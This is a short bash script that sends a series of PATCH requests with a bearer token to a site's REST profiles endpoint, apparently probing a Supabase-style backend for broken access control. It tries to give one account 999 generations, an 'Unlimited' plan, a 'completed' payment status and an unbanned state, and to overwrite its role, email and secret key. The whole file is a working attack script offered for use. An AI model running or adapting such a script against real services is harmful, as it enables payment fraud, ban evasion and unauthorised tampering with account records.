#!/bin/bash
set -u
SB='https://cdn.onlyfakeai.ru'
KEY='<publishable-key>'
TOK=$(cat /tmp/token.txt)
UUSER='23c8fb62-49c5-42d9-b031-906b97cd1cb4'
UA='Mozilla/5.0'

patch() {
  echo "--- $1"
  curl -sS -k -m 15 -A "$UA" -H "apikey: $KEY" -H "Authorization: Bearer $TOK" \
    -H 'Content-Type: application/json' -H 'Prefer: return=representation' \
    -X PATCH -d "$1" -o /tmp/x.bin -w 'HTTP %{http_code} ' \
    "$SB/rest/v1/profiles?user_id=eq.$UUSER"
  head -c 300 /tmp/x.bin; echo
}

patch '{"generations_left":999}'
patch '{"activePlan":"Unlimited"}'
patch '{"payment_status":"completed"}'
patch '{"auto_delete_days":0}'
patch '{"secret_key":"x"}'
patch '{"banned":false}'
patch '{"role":"user"}'
patch '{"email":"test2@x.com"}'
patch '{"remarks":"hi"}'
